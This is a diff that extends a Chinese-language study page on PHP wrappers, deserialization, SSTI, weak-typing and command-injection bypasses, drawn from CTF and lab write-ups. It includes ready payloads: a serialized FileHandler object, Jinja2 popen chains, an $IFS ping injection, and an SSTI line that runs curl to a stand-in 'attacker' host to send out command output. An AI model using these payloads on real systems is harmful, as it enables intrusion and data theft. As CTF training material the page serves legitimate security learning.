@@ -1,12 +1,10 @@
 ---
 title: PHP伪协议与反序列化利用
 description: 系统梳理 PHP 伪协议（php://filter、php://input、data://、file://、gopher:// 等）利用技巧，深度解析反序列化漏洞中
-  __wakeup 绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异导致的利用细节。补充 SSRF 场景下 file:// 本地文件读取、gopher://
-  发送原始 TCP 数据包攻击 FastCGI/Redis、双重 URL 编码绕过解析机制及多种绕过技巧。结合赣网杯2020、攻防世界 unserialize3
-  与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链，并新增 Pikachu 靶场 PHP 反序列化漏洞实战复现案例。本次更新整合
-  BUUCTF 实战题目（WarmUp、include1、Secret File、nizhuansiwei、php、facebook、ZJCTF、easy_serialize_php、PHPWEB、had
-  a had day 等）的详细利用链与绕过细节，并补充 Java 反序列化特征识别与 XXE 漏洞利用、绕过、修复方案。新增文件包含场景下伪协议实战细节（php://filter
-  读取源码、php://input 执行代码、data:// 绕过、file:// 读取敏感文件、远程包含绕过），并交叉引用 php-file-inclusion-vulnerability.md。
+  __wakeup 绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异导致的利用细节，以及 PHP 7.1+ protected 属性序列化产生不可见字符被
+  is_valid 拦截的绕过技巧。补充 SSRF 场景下 file:// 本地文件读取、gopher:// 发送原始 TCP 数据包攻击 FastCGI/Redis、双重
+  URL 编码绕过解析机制及多种绕过技巧。结合赣网杯2020、攻防世界 unserialize3 与 Web_php_unserialize、CTFHUB SSRF
+  靶场、Pikachu 靶场、BUUCTF 及 XD安全 Day31-39/83-85 学习笔记实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及相关题解。
 category: program-analysis
 tags:
 - PHP
@@ -40,14 +38,22 @@ tags:
 - php://filter
 - php://input
 - data://
+- SSTI
+- 弱类型比较
+- preg_match绕过
+- RCE
+- IFS绕过
+- PHP7.1绕过
+- protected属性
+- XD安全
 date: '2020-10-01'
 updated: '2026-11-14'
 ---
 ## 概述
 
-本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。**文件包含漏洞场景**下的伪协议实战细节（本地/远程包含、目录穿越、截断绕过、敏感文件路径）亦在本页详述。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场**、**Pikachu 靶场**、**BUUCTF** 及 **XD安全 Day31-39 学习笔记** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]]、[[pikachu-target-writeup-part5]]、[[xd-security-file-inclusion-notes]] 相关题解。
+本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。**文件包含漏洞场景**下的伪协议实战细节（本地/远程包含、目录穿越、截断绕过、敏感文件路径）亦在本页详述。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场**、**Pikachu 靶场**、**BUUCTF** 及 **XD安全 Day31-39、Day83-85 学习笔记** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]]、[[pikachu-target-writeup-part5]]、[[xd-security-file-inclusion-notes]]、[[xd-security-ctf-flag-notes-day83-85]] 相关题解。
 
-**本次更新**整合了 **XD安全 Day37-39 学习笔记**，补充了 PHP 序列化字符串格式的细节（整型 `i:value`）、Java 反序列化的特征识别（`rO0AB`/`aced`）、`ysoserial` 工具链使用、以及 XXE 漏洞的利用姿势（文件读取、内网探测、盲注带外数据外带、UTF-16BE 编码绕过、外部 DTD 攻击）及修复方案。新增 **文件包含漏洞专题交叉引用** 指向 [[php-file-inclusion-vulnerability]]，形成完整知识体系。
+**本次更新**整合了 **XD安全 Day37-39 学习笔记**，补充了 PHP 序列化字符串格式的细节（整型 `i:value`）、Java 反序列化的特征识别（`rO0AB`/`aced`）、`ysoserial` 工具链使用、以及 XXE 漏洞的利用姿势（文件读取、内网探测、盲注带外数据外带、UTF-16BE 编码绕过、外部 DTD 攻击）及修复方案。**本次更新亦整合 XD安全 Day83-85 学习笔记**，新增 PHP 7.1+ 反序列化 protected 属性绕过技巧、SSTI 模板注入绕过姿势（url_for._globals_、__getitem__/pop、chr 编码、{% if %} 盲注）、Python 格式化字符串漏洞（%/Template/format/f-string）、PHP 弱类型比较与 preg_match 绕过（异或、取反、数组、PCRE 回溯、换行符）、RCE 中 IFS 变量展开绕过等核心技术点。新增文件包含漏洞专题交叉引用指向 [[php-file-inclusion-vulnerability]]，形成完整知识体系。
 
 ---
 
@@ -238,13 +244,76 @@ PHP `serialize()` 输出的字符串遵循特定的类型标识符与长度/值�
 
 ---
 
+## PHP 7.1+ 反序列化 Protected 属性绕过技巧
+
+> 来源：XD安全 Day85 学习笔记 (BUUCTF 反序列化题目实战)
+
+### 核心原理
+
+PHP 7.1+ 在序列化 `protected` 属性时，会在属性名前插入两个不可见字符：`\x00*\x00` (即 `%00%00`)。若目标代码中存在类似 `is_valid` 的检测函数，遍历字符串判断 ASCII 是否在可见范围 (32-125)，则包含 `%00` 的序列化字符串会被拦截。
+
+**典型防御代码**：
+```php
+function is_valid($str) {
+    for($i=0; $i<strlen($str); $i++) {
+        $c = ord($str[$i]);
+        if($c < 32 || $c > 125) return false; // 拦截不可见字符
+    }
+    return true;
+}
+```
+
+### 绕过方法：将 protected 改为 public
+
+1.  **本地构造类时声明属性为 `public`**：
+    ```php
+    class FileHandler {
+        public $op = "2";
+        public $filename = "flag.php";
+        public $content = "";
+    }
+    ```
+2.  **序列化生成的字符串不含 `\x00*\x00`**，全为可见字符，可通过 `is_valid` 检测。
+3.  **反序列化时 PHP 不强制要求属性访问修饰符完全匹配**：只要属性名一致，`public` 序列化数据可成功填充目标类的 `protected` 属性。
+
+### 实战案例：BUUCTF 反序列化题目 (FileHandler 类)
+
+**目标类定义 (源码泄露获取)**：
+```php
+class FileHandler {
+    protected $op;
+    protected $filename;
+    protected $content;
+    
+    function __destruct() {
+        if ($this->op === "1") $this->write();
+        else if ($this->op === "2") $this->read();
+    }
+    
+    function write() { file_put_contents($this->filename, $this->content); }
+    function read() { echo file_get_contents($this->filename); }
+    
+    function is_valid($str) { /* 可见字符检测 */ }
+}
+```
+
+**利用步骤**：
+1.  读取源码获取类结构 (利用 `php://filter`)。
+2.  本地定义 `public` 版本类，设置 `$op="2"` (触发 read)、`$filename="flag.php"`。
+3.  序列化生成 Payload：`O:11:"FileHandler":3:{s:2:"op";s:1:"2";s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}`
+4.  传入 `password` 参数 (或对应反序列化入口)，绕过 `is_valid`，触发 `__destruct` 读取 Flag。
+
+> **关键点**：此技巧适用于**属性访问修饰符为 protected/private 且存在不可见字符过滤**的场景。若无过滤，仍需按原类定义构造准确序列化串。
+
+---
+
 ## 反序列化魔术方法利用链对比
 
 | 魔术方法 | 触发时机 | 核心利用条件 | 典型绕过/利用点 | 本文涉及题目 |
 | :--- | :--- | :--- | :--- | :--- |
 | **`__wakeup`** | `unserialize()` 成功后 | 类定义中存在 `__wakeup` 且有防御逻辑 | **对象属性计数不匹配** (声明 > 实际) 绕过执行 | `unserialize3`, `Web_php_unserialize`, BUUCTF `php` |
 | **`__toString`** | 对象作为字符串使用 (`echo`/拼接) | 代码中直接 `echo $obj` 或字符串拼接 | 控制属性进入 `file_get_contents` / SQL / `file_put_contents` | 赣网杯2020, Pikachu, BUUCTF `nizhuansiwei`, `ZJCTF` |
-| **`__destruct`** | 对象销毁 (脚本结束/引用计数为0) | 无特殊条件，最通用触发点 | 文件操作、命令执行、链式调用起点 | `Web_php_unserialize`, BUUCTF `PHPWEB` |
+| **`__destruct`** | 对象销毁 (脚本结束/引用计数为0) | 无特殊条件，最通用触发点 | 文件操作、命令执行、链式调用起点 | `Web_php_unserialize`, BUUCTF `PHPWEB`, FileHandler案例 |
 | **`__construct`** | 对象创建 (`new`) | 反序列化**不触发** (仅 `new` 触发) | 仅用于本地生成 Payload 时初始化属性 | 本地 EXP 脚本 |
 | **`__sleep`** | `serialize()` 之前 | 可控制序列化哪些属性 | 隐藏敏感属性、配合 `__wakeup` 逻辑 | - |
 | **`__call`/`__callStatic`** | 调用不可访问方法时 | 存在动态方法调用 | 链式调用起点、 POP 链构造 | PHAR 反序列化链 |
@@ -1318,6 +1387,152 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
 
 ---
 
+## SSTI (服务端模板注入) 利用与绕过补充
+
+> 来源：XD安全 Day83 学习笔记、[[python-ssti-multi-engine-bypass]]
+
+SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。常见于 Jinja2 (Flask)、Tornado、Mako 等 Python 模板引擎，以及 PHP 的 Twig、Smarty 等。
+
+### 漏洞检测
+
+*   **基础探测**：`{{7*7}}` -> 返回 `49` 确认模板引擎执行表达式。
+*   **引擎指纹识别**：`{{config}}` (Flask/Jinja2)、`{{self}}` (Tornado) 等特有对象。
+
+### 核心利用链 (Jinja2/Flask 为例)
+
+1.  **基础对象访问**：`''` (空字符串) -> `__class__` -> `__mro__` -> `__bases__` -> `object`。
+2.  **子类遍历**：`object.__subclasses__()` 获取所有新式类子类列表。
+3.  **寻找危险类**：遍历寻找 `subprocess.Popen`、`os.popen`、`builtins.eval` 等可执行命令的类索引 (常见索引 71, 128, 250 等随版本变化)。
+4.  **调用执行**：`{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['popen']('whoami').read()}}`
+
+### 关键绕过技巧 (XD安全 Day83 笔记实战)
+
+| 过滤点 | 绕过 Payload / 技巧 | 原理 |
+| :--- | :--- | :--- |
+| **括号 `()` 过滤** | `__getitem__(index)` 替代 `[index]` <br> `pop(index)` 替代 `[index]` <br> `{{url_for._globals_}}` 替代 `{{config}}` | 利用字典/列表对象方法绕过语法过滤；`url_for._globals_` 直接访问全局变量无需调用。 |
+| **中括号 `[]` 过滤** | 同上：`__getitem__`、`pop` | 方法调用替代下标访问。 |
+| **逗号 `,` 过滤** | `chr(119)%2bchr(104)...` 拼接字符串 <br> 利用 `request.args.get('cmd')` 从参数获取 | 利用 `chr()` 编码 + URL 编码 `%2b` (+) 绕过逗号分隔参数。 |
+| **引号 `'` `"` 过滤** | `request.args.xxx` 获取参数值 <br> `config.get('SECRET_KEY')` 利用字典方法 | 从外部输入获取字符串，避免在 Payload 中硬编码引号。 |
+| **双大括号 `{{ }}` 过滤** | `{% if ''.__class__.__mro__[2].__subclasses__().pop(250).__init__.__globals__.os.popen('curl http://attacker/?i=`whoami`').read()=='p' %}1{% endif %}` | 利用模板引擎的控制结构标签 `{% %}` 执行逻辑，盲注带出数据。 |
+| **下划线 `_` 过滤** | `request['application']['\x5f\x5fglobals\x5f\x5f']` (Hex 编码) | 利用十六进制转义绕过关键字过滤。 |
+
+### 实战案例：[WesternCTF2018] shrine 1
+
+*   **过滤情况**：过滤 `()`、`[]`、逗号、引号等。
+*   **利用链**：
+    1.  `{{url_for._globals_}}` 泄露全局配置 (绕过 `config` 过滤)。
+    2.  `{{url_for._globals_['current_app'].config}}` 查看配置。
+    3.  `"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen('whoami').read()` (绕过 `[]` `,` `()`)。
+    4.  盲注绕过 `{{ }}`：`{% if ... %}1{% endif %}`。
+
+---
+
+## Python 格式化字符串漏洞
+
+> 来源：XD安全 Day83 学习笔记
+
+Python 中若**格式化字符串模板可控**，攻击者可注入特殊变量访问敏感数据或执行代码。
+
+### 四大格式化方式及风险
+
+| 方式 | 语法示例 | 风险等级 | 利用示例 |
+| :--- | :--- | :--- | :--- |
+| **`%` 操作符** | `'Hello %s' % name` | 低 | 仅支持简单占位符，难以访问对象属性链。 |
+| **`string.Template`** | `Template('$name').substitute(name=name)` | 低 | 安全设计，仅支持 `$var` 变量替换。 |
+| **`str.format()`** | `'Hello {}'.format(name)` <br> `'{__import__("os").system("id")}'` | **高** | 支持属性访问 `.`、下标 `[]`、函数调用 `()`，可访问 `__globals__`、`__builtins__` 实现 RCE。 |
+| **f-Strings (Py 3.6+)** | `f'Hello {name}'` <br> `f'{__import__("os").system("id")}'` | **极高** | 表达式直接在 `{}` 中求值，**等同于 `eval`**，可执行任意 Python 代码。 |
+
+**核心防御**：**永远不要将用户输入直接作为格式化模板字符串** (`format(user_input)` 或 `f"{user_input}"`)。应使用固定模板，用户输入仅作为参数值传入。
+
+---
+
+## PHP 弱类型比较与 `preg_match` 绕过技巧
+
+> 来源：XD安全 Day84 学习笔记
+
+### 弱类型比较 (`==` vs `===`)
+
+PHP `==` 比较时会进行类型转换，导致逻辑绕过。
+
+| 场景 | Payload | 原理 |
+| :--- | :--- | :--- |
+| **字符串 vs 数字** | `num=1x` 绕过 `$num == 1` | 字符串 `"1x"` 转数字为 `1` (忽略非数字后缀)。 |
+| **科学计数法** | `"0e12345" == "0e67890"` (True) | 视为科学计数法 `0 * 10^n` 均为 `0`。 |
+| **MD5 碰撞** | `QNKCDZO` / `s878926199a` (MD5 以 `0e` 开头) | `md5($a) == md5($b)` 为 True。 |
+| **数组 vs 字符串** | `param[]=1` 绕过 `$param == 'string'` | 数组转字符串为 `"Array"`，比较时可能触发类型转换逻辑。 |
+
+**防御**：**严格使用 `===` (全等) 比较**，同时检查类型与值。
+
+### `preg_match` 绕过技巧大全
+
+目标：绕过 `if (preg_match('/pattern/', $input)) die();` 等过滤。
+
+| 技巧 | 原理 | 示例 |
+| :--- | :--- | :--- |
+| **异或构造** | 两字符串异或产生目标函数名/字符，利用 PHP 变量函数执行 | `('a' ^ 'b')` -> 产生控制字符，配合 `(${...})` 执行。 |
+| **取反 (Bitwise NOT)** | `~"string"` 产生非可见字符，URL 编码传入绕过关键字过滤 | `~"highlight_file"` -> 编码后传入，利用 `(${~"..."})` 执行。 |
+| **数组绕过** | `preg_match` 第二参数若为数组返回 `false` (不报错) | `?input[]=1` -> `$_GET['input']` 为数组，`preg_match` 返回 `false` 绕过 `if` 判断。 |
+| **PCRE 回溯限制** | 正则回溯次数超限 (默认 1000000) 导致 `preg_match` 返回 `false` | 构造长字符串触发灾难性回溯 (如 `preg_match('/(a+)+b/', 'a'*1000000)`)。 |
+| **换行符绕过** | 正则默认 `.` 不匹配 `\n`，`^` `$` 仅匹配字符串首尾 (除非 `m` 修饰符) | 多行输入中注入恶意内容绕过单行匹配正则。 |
+
+---
+
+## RCE 命令执行绕过：IFS 变量展开
+
+> 来源：XD安全 Day84 学习笔记 (BUUCTF `ping ping ping` 题目)
+
+### 场景
+
+`ping` 命令注入，过滤了空格和 `flag.php` 关键字。
+
+### 利用 Payload
+
+```text
+/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php
+```
+
+### 解析
+
+1.  `a=g` 定义变量 `a` 值为 `g`。
+2.  `$IFS` -> Bash 内部字段分隔符 (默认含空格、制表符、换行符)，**替代空格** 分隔命令参数。
+3.  `$2` -> 空变量 (未定义)，展开为空字符串，**用于打断关键字** `flag` (变为 `fla` + `` + `g.php`)。
+4.  `$a` -> 变量 `g`，拼接为 `flag.php`。
+5.  最终执行：`cat flag.php`。
+
+> **核心技巧**：`$IFS` 替代空格；`$未定义变量` 或 `${var}str` 语法打断敏感关键字匹配。
+
+---
+
+## Java WEB-INF 文件读取与反编译
+
+> 来源：XD安全 Day84 学习笔记
+
+### WEB-INF 目录结构敏感文件
+
+| 路径 | 含义 |
+| :--- | :--- |
+| `/WEB-INF/web.xml` | 应用配置：Servlet 映射、Filter、Listener、初始化参数。 |
+| `/WEB-INF/classes/` | 编译后的 Class 文件 (包含业务逻辑、Flag 处理代码)。 |
+| `/WEB-INF/lib/` | 依赖 Jar 包 (可下载反编译分析框架版本漏洞)。 |
+| `/WEB-INF/src/` | 源码目录 (若误打包部署)。 |
+| `/WEB-INF/database.properties` | 数据库连接配置 (凭据泄露)。 |
+
+### 利用流程
+
+1.  **任意文件读取/下载漏洞** 读取 `web.xml` (如 `filename=../../WEB-INF/web.xml`)。
+2.  解析 `web.xml` 中 `<servlet-class>` 确定核心类全限定名 (如 `com.ctf.FlagController`)。
+3.  推断 Class 文件路径：`/WEB-INF/classes/com/ctf/FlagController.class`。
+4.  下载 Class 文件，使用 **JADX / Fernflower / CFR / IDEA** 反编译还原源码。
+5.  分析源码寻找 Flag 逻辑、硬编码密钥、反序列化入口等。
+
+### 实战案例：[RoarCTF 2019] Easy Java
+
+*   读取 `web.xml` -> 发现 `FlagController`。
+*   下载 `FlagController.class` -> 反编译 -> 发现 Flag 在 Base64 编码字符串中。
+*   解码获取 Flag。
+
+---
+
 ## 核心知识点总结
 
 ### 伪协议组合拳
@@ -1338,7 +1553,8 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
     *   `private $prop` -> `s:length:"\00ClassName\00prop"`
     *   `protected $prop` -> `s:length:"\00*\00prop"`
     *   长度计算包含两个不可见字节 (`\00`)，手工修改极易出错，**强制要求本地代码生成**。
-5.  **对象逃逸利用**：利用 `extract`、`parse_str` 等变量覆盖函数，配合过滤函数导致序列化字符串长度变化，构造键值对逃逸，控制反序列化后的数组结构 (如 BUUCTF `easy_serialize_php`)。
+5.  **PHP 7.1+ Protected 绕过**：若存在不可见字符过滤 (`is_valid`)，将本地类属性改为 `public` 序列化，利用 PHP 反序列化宽容特性填充目标 `protected` 属性。
+6.  **对象逃逸利用**：利用 `extract`、`parse_str` 等变量覆盖函数，配合过滤函数导致序列化字符串长度变化，构造键值对逃逸，控制反序列化后的数组结构 (如 BUUCTF `easy_serialize_php`)。
 
 ### SSRF 利用核心要点
 
@@ -1357,6 +1573,18 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
 *   **绕过**：UTF-16BE 编码、协议替换、大小写混淆、注释干扰。
 *   **修复**：禁用外部实体 (代码层面 `setFeature` / `libxml_disable_entity_loader`)。
 
+### SSTI & Python 格式化字符串速查
+
+*   **SSTI 入口**：`{{7*7}}` 测试 -> `''` -> `__class__` -> `__mro__` -> `__bases__` -> `object` -> `__subclasses__()` -> 危险类索引 -> `__init__.__globals__` -> `popen`/`eval`。
+*   **绕过组合**：`__getitem__`/`pop` (括号) -> `chr()` (引号/逗号) -> `{% if %}` (双大括号) -> `url_for._globals_` (信息泄露)。
+*   **Python 格式化**：`str.format()` 与 f-string **极危**，若模板可控直接 RCE。严禁 `format(user_input)` / `f"{user_input}"`。
+
+### PHP 弱类型 & RCE 绕过速查
+
+*   **弱类型**：`==` 会转型，`"1x"==1` 为 True。必须用 `===`。
+*   **preg_match 绕过**：异或、取反、数组参数、PCRE 回溯、换行符。
+*   **命令执行**：`$IFS` 替代空格；`$未定义变量` 打断关键字；`${var}str` 拼接。
+
 ---
 
 ## 关联页面
@@ -1373,6 +1601,9 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
 *   [[xxe-xml-dtd-fundamentals]] - XXE 漏洞利用核心基础：XML 语法树结构、DTD 声明类型、实体引用分类、PCDATA 与 CDATA 差异，及外部实体通过 file/http 等协议实现任意文件读取的攻击原理。
 *   [[php-file-inclusion-vulnerability]] - **PHP 文件包含漏洞完整知识页**，系统梳理成因、四大危险函数差异、目录穿越与截断绕过、php://filter/php://input/data:// 等伪协议利用链、任意文件下载漏洞检测与敏感文件路径清单，**本页面文件包含场景伪协议细节的核心交叉引用目标**。
 *   [[xd-security-file-inclusion-notes]] - XD安全 Day31-32 文件包含学习笔记，本页面文件包含场景伪协议实战细节的主要归档来源。
+*   [[xd-security-ctf-flag-notes-day83-85]] - XD安全 Day83-85 学习笔记，本页面新增 PHP 7.1+ 反序列化绕过、SSTI、Python 格式化字符串、PHP 弱类型/preg_match/RCE 绕过技巧的主要归档来源。
+*   [[xd-security-deserialization-xxe-notes-day37-39]] - XD安全 Day37-39 学习笔记，PHP/Java 反序列化、XXE 核心基础的归档来源。
+*   [[python-ssti-multi-engine-bypass]] - Python SSTI 多引擎绕过技巧详解，交叉引用本页面 SSTI 补充内容。
 *   [[mongodb-nosql-injection-guide]] - MongoDB NoSQL 注入指南，涉及反序列化对象注入变种利用思路对比参考。
 
 ---
@@ -1395,7 +1626,7 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
 *   ysoserial: https://github.com/frohoff/ysoserial
 *   Java 反序列化规范: https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html
 *   XXE 防御备忘单 (OWASP): https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
-*   XD安全渗透测试课程 Day31-39 学习笔记 (微信归档)
+*   XD安全渗透测试课程 Day31-39、Day83-85 学习笔记 (微信归档)
 
 ---
 
@@ -1406,3 +1637,5 @@ XXE (XML External Entity Injection) 利用 XML 解析器处理外部实体的特
 - [0x00实验室-202108-202304_089](../sources/0x00实验室-202108-202304_089.md)
 - [XD安全 Day31-32 文件包含笔记](../sources/XD安全-文件包含笔记.md) (归档文章内容整合)
 - [0x00实验室-202108-202304_091](../sources/0x00实验室-202108-202304_091.md)
+- [XD安全 Day83-85 学习笔记](../sources/XD安全-反序列化与XXE笔记.md) (归档文章内容整合，即用户提供的当前归档文章)
+- [0x00实验室-202108-202304_097](../sources/0x00实验室-202108-202304_097.md)
